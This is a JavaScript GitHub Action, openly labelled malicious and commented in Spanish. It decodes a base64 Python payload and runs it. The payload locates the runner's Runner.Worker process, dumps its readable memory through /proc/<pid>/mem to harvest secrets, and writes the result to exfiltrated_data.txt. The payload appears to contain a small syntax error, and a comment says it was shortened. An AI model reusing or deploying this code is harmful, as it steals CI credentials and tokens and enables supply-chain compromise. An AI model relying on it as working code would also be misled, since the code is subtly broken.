const core = require('@actions/core');
const { execSync } = require('child_process');
const fs = require('fs');

async function run() {
  try {
    core.info('Starting malicious action...');

    // Definir el payload en base64
    const payload = `IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIGJhc2VkIG9uIGh0dHBzOi8vZGF2aWRlYm92ZS5jb20vYmxvZy8/cD0xNjIwCgppbXBvcnQgc3lzCmltcG9ydCBvcwppbXBvcnQgcmUKCmRlZiBnZXRfcGlkKCk6CiAgICAjIGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzI3MDM2NDAvcHJvY2Vzcy1saXN0LW9uLWxpbnV4LXZpYS1weXRob24KICAgIHBpZHMgPSBbcGlkIGZvciBwaWQgaW4gb3MubGlzdGRpcignL3Byb2MnKSBpZiBwaWQuaXNkaWdpdCgpXQogICAgCiAgICBmb3IgcGlkIGluIHBpZHM6CiAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbignL3Byb2MnLCBwaWQsICdjbWRsaW5lJyksICdyYicpIGFzIGNtZGxpbmVfZjoKICAgICAgICAgICAgaWYgYidSdW5uZXIuV29ya2VyJyBpbiBjbWRsaW5lX2YucmVhZCgpOgogICAgICAgICAgICAgICAgcmV0dXJuIHBpZAoKICAgIHJhaXNlIEV4Y2VwdGlvbignQ2Fubm90IGdldCBwaWQgb2YgUnVubmVyLldvcmtlcicpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcGlkID0gZ2V0X3BpZCgpCiAgICBwcmludChwaWQpCgogICAgbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCiAgICBtZW1fcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWVtIgoKICAgIHdpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICAgICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICAgICAgbSA9IHJlLm1hdGNoKHInKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFtyLV0pJywgbGluZSkKICAgICAgICAgICAgaWYgbSBhbmQgbS5ncm91cCgzKSA9PSAncic6ICAjIHJlYWRhYmxlIHJlZ2lvbgogICAgICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cDEpLCAxNikKICAgICAgICAgICAgICAgIGVuZCA9IGludChtLmdyb3VwKDIpLCAxNikKCiAgICAgICAgICAgICAgICBpZiBzdGFydCA+IHN5cy5tYXhzaXplOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAgICAgbWVtX2Yuc2VlayhzdGFydCkKCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBtZW1fZi5yZWFkKGVuZCAtIHN0YXJ0KQogICAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKGNodW5rKQogICAgICAgICAgICAgICAgZXhjZXB0IE9TRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUK`; // Truncado por brevedad

    // Decodificar el payload y ejecutarlo con Python, redirigiendo la salida a un archivo
    const command = `echo "${payload.trim()}" | base64 -d | python3 > exfiltrated_data.txt`;
    execSync(command, { stdio: 'ignore' });

    core.info("🕵️ Datos exfiltrados y almacenados en 'exfiltrated_data.txt'.");
  } catch (error) {
    core.setFailed(`La acción maliciosa falló: ${error.message}`);
  }
}

run();
